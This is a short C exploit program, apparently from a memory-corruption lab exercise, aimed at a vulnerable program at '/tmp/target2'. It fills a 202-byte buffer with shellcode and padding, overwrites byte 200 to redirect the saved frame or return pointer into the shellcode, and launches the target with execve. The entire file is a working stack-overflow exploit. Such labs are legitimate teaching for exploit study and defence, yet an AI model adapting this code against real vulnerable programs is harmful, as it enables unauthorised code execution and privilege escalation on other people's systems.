#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char sploit[202];
  memset(sploit, 0xff, sizeof sploit);
  memcpy(sploit, shellcode, sizeof shellcode - 1);
  sploit[200] = 0x90 - 8; // Existing value - 8, to insert *sploit as an eip
  sploit[201] = '\0';

  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
